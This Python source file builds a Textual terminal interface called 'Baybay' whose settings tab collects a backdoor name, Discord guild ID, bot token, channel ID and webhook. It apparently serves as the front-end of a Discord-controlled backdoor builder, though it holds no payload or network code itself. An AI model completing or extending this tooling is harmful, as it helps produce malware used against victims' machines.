from textual.app import App, ComposeResult
from textual.widgets import Static
from textual.containers import Center, Vertical, Horizontal, Container
from textual.widgets import Label, Input, Button
from textual.screen import Screen
from textual.widget import Widget
from textual.reactive import reactive

HELP_TABS = [
    ("help", "This is the help section. Use up/down arrows to navigate."),
    ("set", "Set configuration options here."),
    ("build", "Build your project from this tab."),
    ("download", "Manage your downloads here."),
    ("quit", "Quit the application from here."),
]

class HelpTab(Horizontal):
    def __init__(self, tab_index: int = 0):
        super().__init__()
        self.tab_index = tab_index

    def compose(self) -> ComposeResult:
        yield Center(
            Vertical(
                *[
                    Static(
                        tab,
                        classes="selected" if i == self.tab_index else "",
                    )
                    for i, (tab, _) in enumerate(HELP_TABS)
                ],
                id="help-menu"
            )
        )
        yield Static(HELP_TABS[self.tab_index][1], id="help-detail")


class TabScreen(Screen):
    def __init__(self):
        super().__init__()
        self.active_tab = "terminal"
        self.help_tab_index = 0
        self.set_field_index = 0
        self.set_editing = False

    def compose(self) -> ComposeResult:
        yield Center(
            Vertical(
                Static(self.render_tab_bar(), id="tab-bar"),
                Container(id="tab-content"),
                Static("─" * 80, id="footer-line"),
                Static("r restart      h help     q quit", id="footer-hints"),
                id="tab-area"
            )
        )

    def render_tab_bar(self) -> str:
        top = "┌───────────────────┬──────────────────┬──────────────────┬──────────────────┐"
        middle = (
            "│"
            f" {'baybay'.center(17)} │"
            f" {'s set-config'.center(16)} │"
            f" {'d download'.center(16)} │"
            f" {'h help'.center(16)} │"
        )
        bottom = "└───────────────────┴──────────────────┴──────────────────┴──────────────────┘"
        return f"{top}\n{middle}\n{bottom}"

    def render_help_widget(self) -> Center:
        return Center(
            HelpTab(tab_index=self.help_tab_index),
            id="help-tab"
        )

    def render_tab_content(self):
        if self.active_tab == "terminal":
            return Static(
                    "██████╗  █████╗ ██╗   ██╗██████╗  █████╗ ██╗   ██╗\n"
                    "██╔══██╗██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗╚██╗ ██╔╝\n"
                    "██████╔╝███████║ ╚████╔╝ ██████╔╝███████║ ╚████╔╝ \n"
                    "██╔══██╗██╔══██║  ╚██╔╝  ██╔══██╗██╔══██║  ╚██╔╝  \n"
                    "██████╔╝██║  ██║   ██║   ██████╔╝██║  ██║   ██║   \n"
                    "╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝   ╚═╝   \n\n"
                    "              build by vicky aka admin12121\n"
                    "              github: admin12121\n",
                    id="tab-content",
                    expand=False
                )
        elif self.active_tab == "set":
            return Center(
                    Vertical(
                    CLIField("Backdoor Name", id="bakdoor_name"),
                    CLIField("Guild ID", id="guild_id"),
                    CLIField("Bot Token", id="bot_token"),
                    CLIField("Channel ID", id="channel_id"),
                    CLIField("WebHook", id="webhook"),
                    id="set-cli-fields"
                ))
        elif self.active_tab == "download":
            return Static(

                    "Download Tab\n"
                    "=============\n"
                    "Manage your downloads here:\n"
                    "- View current downloads\n"
                    "- Pause/Resume\n"
                    "- Cancel downloads\n"
                    "\n"
                    "Press 'b' to return to Baybay terminal.",
                    id="tab-content",
                    expand=False
                )
        elif self.active_tab == "help":
            return self.render_help_widget()

        return Static("")

    def on_mount(self):
        self.mount_tab_content()

    def mount_tab_content(self):
        container = self.query("#tab-content").first()
        if container:
            container.remove_children()
            container.mount(Center(self.render_tab_content()))

    def on_key(self, event):
        key = event.key

        # --- Handle help tab navigation first ---
        if self.active_tab == "help":
            help_tab = self.query_one(HelpTab)
            if key == "down":
                help_tab.tab_index = (help_tab.tab_index + 1) % len(HELP_TABS)
                help_tab.refresh()
                return
            elif key == "up":
                help_tab.tab_index = (help_tab.tab_index - 1) % len(HELP_TABS)
                help_tab.refresh()
                return
            # Allow tab switching (b/s/d/h/q) in help tab below

        # --- Handle set tab CLI navigation and editing ---
        if self.active_tab == "set":
            fields = list(self.query("CLIField").results())
            if not fields:
                return

            if self.set_editing:
                fields[self.set_field_index].on_key(event)
                if key == "left":
                    self.set_editing = False
                    fields[self.set_field_index].editing = False
                return

            if key in {"b", "s", "d", "h", "q"}:
                if key == "q":
                    self.app.exit()
                    return
                self.active_tab = {
                    "b": "terminal",
                    "s": "set",
                    "d": "download",
                    "h": "help"
                }[key]
                self.mount_tab_content()
                return

            if key == "down":
                self.set_field_index = (self.set_field_index + 1) % len(fields)
            elif key == "up":
                self.set_field_index = (self.set_field_index - 1) % len(fields)
            elif key == "right":
                self.set_editing = True
                fields[self.set_field_index].editing = True

            for i, field in enumerate(fields):
                field.selected = (i == self.set_field_index)
            return

        # --- Handle tab switching for all other tabs ---
        if key in {"b", "s", "d", "h", "q"}:
            if key == "q":
                self.app.exit()
                return
            self.active_tab = {
                "b": "terminal",
                "s": "set",
                "d": "download",
                "h": "help"
            }[key]
            self.mount_tab_content()

class CLIField(Widget):
    value = reactive("")
    editing = reactive(False)
    selected = reactive(False)

    def __init__(self, label: str, value: str = "", id: str = None):
        super().__init__(id=id)
        self.label = label
        self.value = value

    def render(self):
        prompt = f"{self.label:<14} > {self.value if self.value or self.editing else ''}"
        if self.selected:
            # Highlight like .selected in help tab
            return f"[reverse]{prompt}[/reverse]"
        return prompt

    def on_key(self, event):
        if self.editing:
            if event.key == "enter":
                self.editing = False
                self.selected = True
                self.refresh()
            elif event.key == "backspace":
                self.value = self.value[:-1]
                self.refresh()
            elif event.is_printable:
                self.value += event.character
                self.refresh()


class BaybayApp(App):
    CSS = """
    Screen {
        align: center middle;
        background: #181b20;
    }

    #tab-area {
        align: center middle;
        content-align: center middle;
        padding: 1;
    }

    #tab-bar {
        color: white;
        content-align: center middle;
    }

    #tab-content {
        align: center middle;
        content-align: center middle;
        padding: 1;
        height: 25;
    }

    #footer-line {
        color: #666;
        content-align: center middle;
    }

    #footer-hints {
        color: #888;
        content-align: center middle;
        padding-top: 1;
    }

    #help-tab {
        width: 75;
        align: center middle;
        content-align: center middle;
    }
    
    #help-menu {
        width: 15;
        padding: 1;
        color: cyan;
    }

    #help-detail {
        width: 60;
        padding: 2;
    }

    .selected {
        background: cyan;
        color: black;
        width: 100%;
        text-align: left;
    }

    #set-cli-fields{
        width: 75;
        padding: 0 2;
        align: center middle;
        content-align: center middle;
        layout: vertical;
        align: left top;
        padding: 2 4;
    }

    CLIField {
        width: 75;
        padding: 0 2;
        height: 2;
    }

    CLIField.selected {
        background: cyan;
        color: black;
    }

    
    Horizontal {
        layout: horizontal;
        height: auto;
        min-height: 3;
        padding-bottom: 1;
        align: left middle;
        content-align: left middle;
    }
    """

    def on_mount(self):
        self.push_screen(TabScreen())


if __name__ == "__main__":
    from loader import loader
    loader()
    BaybayApp().run()
